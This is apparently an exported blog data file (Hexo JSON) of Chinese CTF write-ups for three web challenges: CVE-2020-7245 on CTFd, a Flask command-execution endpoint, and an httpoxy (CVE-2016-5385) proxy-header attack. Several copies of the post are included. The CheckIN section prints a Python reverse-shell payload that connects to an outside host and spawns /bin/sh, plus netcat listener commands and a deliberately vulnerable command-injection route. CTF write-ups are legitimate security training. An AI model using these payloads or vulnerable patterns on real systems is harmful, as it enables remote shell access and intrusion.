/></span>\n</span>\n</code>flag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}\nflag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}\n```\n\n","source":"_posts/v-n内部赛.md","raw":"---\ntitle: v&n内部赛\ndate: 2020-02-29 00:06:11\nupdated: 2020-03-12 05:06:11\ntags:\n - ctf\n - web\ncategories:\n - 刷题记录\n---\n\n## HappyCTFd\n\n打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码\n\nhttps://www.colabug.com/2020/0204/6940556/amp/\n\n发现有一个题目名字叫做flagflag你在哪\n\n<!--more-->\n\n在file处有一个miaoflag文件打开就是flag\n\n![](/pic/125.png)\n\n\n\n\n\n\n\n## CheckIN\n\n打开题目就是源码\n\n```python\nfrom flask import Flask, request\nimport os\napp = Flask(__name__)\n\nflag_file = open(\"flag.txt\", \"r\")\n# flag = flag_file.read()\n# flag_file.close()\n#\n# @app.route('/flag')\n# def flag():\n#     return flag\n## want flag? naive!\n\n# You will never find the thing you want:) I think\n@app.route('/shell')\ndef shell():\n    os.system(\"rm -f flag.txt\")\n    exec_cmd = request.args.get('c')\n    os.system(exec_cmd)\n    return \"1\"\n\n@app.route('/')\ndef source():\n    return open(\"app.py\",\"r\").read()\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0')\n```\n\n发现flag_file已经打开了flag.txt\n\n可以执行系统命令，发现用bash弹shell用不了\n\n使用DNS/OOB记录所有文件\n\nDNS/OOB[参考文章](https://www.freebuf.com/articles/database/183997.html)\n\n手残了一下把（ls -R/）所有进行了dns解析\n\n使用VPSnc监听12345端口\n\n```bash\nnc -lvvp 12345\n```\n\npayload\n\n```\n?c=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ns.seye.gq\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\n进去之后发现没有grep功能，\n\n```bash\nls -alR /\n```\n\n\n\n列出所有文件搜索flag\n\n![](/pic/126.png)\n\n\n\n\n\n## EasySpringMVC\n\n提供了源码，下载下来进行代码审计\n\n\n\n\n\n\n\n\n\n\n\n\n\n## TimeTravel\n\n打开就是源码\n\n```php\n<?php\nerror_reporting(0);\nrequire __DIR__ . '/vendor/autoload.php';\n\nuse GuzzleHttp\\Client;\n\nhighlight_file(__FILE__);\n\nif(isset($_GET['flag'])) {\n    $client = new Client();\n    $response = $client->get('http://127.0.0.1:5000/api/eligible');\n    $content = $response->getBody();\n    $data = json_decode($content, TRUE);\n    if($data['success'] === true) {   //true返回值是数组,否则返回值为object\n      echo system('/readflag');\n    }\n}\n\nif(isset($_GET['file'])) {\n    highlight_file($_GET['file']);\n}\n\nif(isset($_GET['phpinfo'])) {\n    phpinfo();\n}\n```\n\n查看phpinfo\n\n是5.6.23版本的\n\n发现没有禁用函数\n\n| allow_url_fopen   | On   |\n| ----------------- | ---- |\n| allow_url_include | Off  |\n\n存在任意文件读取\n\n```php\n//autoload.php\nrequire_once __DIR__ . '/composer/autoload_real.php';\n\nreturn ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();\n```\n\n```php\n//autoload_real.php\n\n```\n\n```php\n//./vendor/composer/ClassLoader.php\n```\n\n~~看到guzzlehttp/guzzle有任意写文件漏洞https://www.anquanke.com/post/id/86452~~\n\n查看composer.json\n\n```php\n//composer.json\n{\n   \"require\": {\n      \"guzzlehttp/guzzle\": \"6.2.0\"\n   }\n}\n```\n\n\n\n出题人[赵师傅博客](https://www.zhaoj.in/read-6407.html)也说了是改自https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy\n\n\n\n考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明\n\n> CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。\n>\n> nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。\n>\n> \n>\n>\n\n\n\n访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500\n\n```php\n$response = $client->get('http://127.0.0.1:5000/api/eligible');\n```\n\n在代理服务器中弄一个web服务器，api/eligible的内容为\n\n```\n{\"success\":True}\n```\n\n即可得到。\n\n**注意**\n\n由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，\n\n创建一个文件内容为例如 a.txt\n\n```http\nHTTP/1.1 200 OK\n\n{\"success\":true}\n```\n\n在linux上使用命令\n\n```bash\nnc -lvp 1234 < a.txt\n```\n\n然后发访问http://xxx/?flag，抓包添加一个proxy头部 地址为你获取控制权的linux ip地址\n\n```http\nGET /?flag HTTP/1.1\nHost: node3.buuoj.cn:25315\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0, no-cache\nProxy: http://174.0.246.216:1234/\nPragma: no-cache\n```\n\n即可获取flag\n\n```html\n \n ········\n \n#DD0000\">'phpinfo'</span><span style=\"color: #007700\">]))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">phpinfo</span><span style=\"color: #007700\">();<br />}<br /></span>\n</span>\n</code>flag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}\nflag{7d7b2c9e-088c-4733-b70a-8ff3351479a7}\n```\n\n","slug":"v-n内部赛","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfm40019pk7ea63w5bzt","content":"<h2 id=\"HappyCTFd\"><a href=\"#HappyCTFd\" class=\"headerlink\" title=\"HappyCTFd\"></a>HappyCTFd</h2><p>打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码</p>\n<p><a href=\"https://www.colabug.com/2020/0204/6940556/amp/\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/2020/0204/6940556/amp/</a></p>\n<p>发现有一个题目名字叫做flagflag你在哪</p>\n<a id=\"more\"></a>\n\n<p>在file处有一个miaoflag文件打开就是flag</p>\n<p><img src=\"/pic/125.png\" alt=\"\"></p>\n<h2 id=\"CheckIN\"><a href=\"#CheckIN\" class=\"headerlink\" title=\"CheckIN\"></a>CheckIN</h2><p>打开题目就是源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">flag_file = open(<span class=\"string\">\"flag.txt\"</span>, <span class=\"string\">\"r\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># flag = flag_file.read()</span></span><br><span class=\"line\"><span class=\"comment\"># flag_file.close()</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># @app.route('/flag')</span></span><br><span class=\"line\"><span class=\"comment\"># def flag():</span></span><br><span class=\"line\"><span class=\"comment\">#     return flag</span></span><br><span class=\"line\"><span class=\"comment\">## want flag? naive!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># You will never find the thing you want:) I think</span></span><br><span class=\"line\"><span class=\"meta\">@app.route('/shell')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shell</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    os.system(<span class=\"string\">\"rm -f flag.txt\"</span>)</span><br><span class=\"line\">    exec_cmd = request.args.get(<span class=\"string\">'c'</span>)</span><br><span class=\"line\">    os.system(exec_cmd)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"1\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">source</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"app.py\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>发现flag_file已经打开了flag.txt</p>\n<p>可以执行系统命令，发现用bash弹shell用不了</p>\n<p>使用DNS/OOB记录所有文件</p>\n<p>DNS/OOB<a href=\"https://www.freebuf.com/articles/database/183997.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p>手残了一下把（ls -R/）所有进行了dns解析</p>\n<p>使用VPSnc监听12345端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 12345</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ns.seye.gq&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n\n<p>进去之后发现没有grep功能，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -alR /</span><br></pre></td></tr></table></figure>\n\n\n\n<p>列出所有文件搜索flag</p>\n<p><img src=\"/pic/126.png\" alt=\"\"></p>\n<h2 id=\"EasySpringMVC\"><a href=\"#EasySpringMVC\" class=\"headerlink\" title=\"EasySpringMVC\"></a>EasySpringMVC</h2><p>提供了源码，下载下来进行代码审计</p>\n<h2 id=\"TimeTravel\"><a href=\"#TimeTravel\" class=\"headerlink\" title=\"TimeTravel\"></a>TimeTravel</h2><p>打开就是源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">GuzzleHttp</span>\\<span class=\"title\">Client</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'flag'</span>])) &#123;</span><br><span class=\"line\">    $client = <span class=\"keyword\">new</span> Client();</span><br><span class=\"line\">    $response = $client-&gt;get(<span class=\"string\">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class=\"line\">    $content = $response-&gt;getBody();</span><br><span class=\"line\">    $data = json_decode($content, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($data[<span class=\"string\">'success'</span>] === <span class=\"keyword\">true</span>) &#123;   <span class=\"comment\">//true返回值是数组,否则返回值为object</span></span><br><span class=\"line\">      <span class=\"keyword\">echo</span> system(<span class=\"string\">'/readflag'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    highlight_file($_GET[<span class=\"string\">'file'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'phpinfo'</span>])) &#123;</span><br><span class=\"line\">    phpinfo();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看phpinfo</p>\n<p>是5.6.23版本的</p>\n<p>发现没有禁用函数</p>\n<table>\n<thead>\n<tr>\n<th>allow_url_fopen</th>\n<th>On</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>allow_url_include</td>\n<td>Off</td>\n</tr>\n</tbody></table>\n<p>存在任意文件读取</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//autoload.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/composer/autoload_real.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//autoload_real.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//./vendor/composer/ClassLoader.php</span></span><br></pre></td></tr></table></figure>\n\n<p><del>看到guzzlehttp/guzzle有任意写文件漏洞<a href=\"https://www.anquanke.com/post/id/86452\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/86452</a></del></p>\n<p>查看composer.json</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//composer.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   <span class=\"string\">\"require\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"guzzlehttp/guzzle\"</span>: <span class=\"string\">\"6.2.0\"</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>出题人<a href=\"https://www.zhaoj.in/read-6407.html\" target=\"_blank\" rel=\"noopener\">赵师傅博客</a>也说了是改自<a href=\"https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy\" target=\"_blank\" rel=\"noopener\">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p>\n<p>考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明</p>\n<blockquote>\n<p>CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。</p>\n<p>nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。</p>\n</blockquote>\n<p>访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$response = $client-&gt;get(<span class=\"string\">'http://127.0.0.1:5000/api/eligible'</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在代理服务器中弄一个web服务器，api/eligible的内容为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;success&quot;:True&#125;</span><br></pre></td></tr></table></figure>\n\n<p>即可得到。</p>\n<p><strong>注意</strong></p>\n<p>由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，</p>\n<p>创建一个文件内容为例如 a.txt</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">200</span> OK</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"success\":true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在linux上使用命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 1234 &lt; a.txt</span><br></pre></td></tr></table></figure>\n\n<p>然后发访问<a href=\"http://xxx/?flag，抓包添加一个proxy头部\" target=\"_blank\" rel=\"noopener\">http://xxx/?flag，抓包添加一个proxy头部</a> 地址为你获取控制权的linux ip地址</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/?flag</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: node3.buuoj.cn:25315</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: max-age=0, no-cache</span><br><span class=\"line\"><span class=\"attribute\">Proxy</span>: http://174.0.246.216:1234/</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br></pre></td></tr></table></figure>\n\n<p>即可获取flag</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"> ········</span><br><span class=\"line\"> </span><br><span class=\"line\">#DD0000\"&gt;'phpinfo'<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #007700\"</span>&gt;</span>]))<span class=\"symbol\">&amp;nbsp;</span>&#123;<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #0000BB\"</span>&gt;</span>phpinfo<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #007700\"</span>&gt;</span>();<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span>&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span>flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br><span class=\"line\">flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"HappyCTFd\"><a href=\"#HappyCTFd\" class=\"headerlink\" title=\"HappyCTFd\"></a>HappyCTFd</h2><p>打开发现是一个CTFD的平台，搜索一下发现存在漏洞CVE-2020-7245，修改admin的密码</p>\n<p><a href=\"https://www.colabug.com/2020/0204/6940556/amp/\" target=\"_blank\" rel=\"noopener\">https://www.colabug.com/2020/0204/6940556/amp/</a></p>\n<p>发现有一个题目名字叫做flagflag你在哪</p>","more":"<p>在file处有一个miaoflag文件打开就是flag</p>\n<p><img src=\"/pic/125.png\" alt=\"\"></p>\n<h2 id=\"CheckIN\"><a href=\"#CheckIN\" class=\"headerlink\" title=\"CheckIN\"></a>CheckIN</h2><p>打开题目就是源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">flag_file = open(<span class=\"string\">\"flag.txt\"</span>, <span class=\"string\">\"r\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># flag = flag_file.read()</span></span><br><span class=\"line\"><span class=\"comment\"># flag_file.close()</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># @app.route('/flag')</span></span><br><span class=\"line\"><span class=\"comment\"># def flag():</span></span><br><span class=\"line\"><span class=\"comment\">#     return flag</span></span><br><span class=\"line\"><span class=\"comment\">## want flag? naive!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># You will never find the thing you want:) I think</span></span><br><span class=\"line\"><span class=\"meta\">@app.route('/shell')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shell</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    os.system(<span class=\"string\">\"rm -f flag.txt\"</span>)</span><br><span class=\"line\">    exec_cmd = request.args.get(<span class=\"string\">'c'</span>)</span><br><span class=\"line\">    os.system(exec_cmd)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"1\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">source</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"app.py\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>发现flag_file已经打开了flag.txt</p>\n<p>可以执行系统命令，发现用bash弹shell用不了</p>\n<p>使用DNS/OOB记录所有文件</p>\n<p>DNS/OOB<a href=\"https://www.freebuf.com/articles/database/183997.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p>手残了一下把（ls -R/）所有进行了dns解析</p>\n<p>使用VPSnc监听12345端口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 12345</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c&#x3D;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ns.seye.gq&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n\n<p>进去之后发现没有grep功能，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -alR /</span><br></pre></td></tr></table></figure>\n\n\n\n<p>列出所有文件搜索flag</p>\n<p><img src=\"/pic/126.png\" alt=\"\"></p>\n<h2 id=\"EasySpringMVC\"><a href=\"#EasySpringMVC\" class=\"headerlink\" title=\"EasySpringMVC\"></a>EasySpringMVC</h2><p>提供了源码，下载下来进行代码审计</p>\n<h2 id=\"TimeTravel\"><a href=\"#TimeTravel\" class=\"headerlink\" title=\"TimeTravel\"></a>TimeTravel</h2><p>打开就是源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span 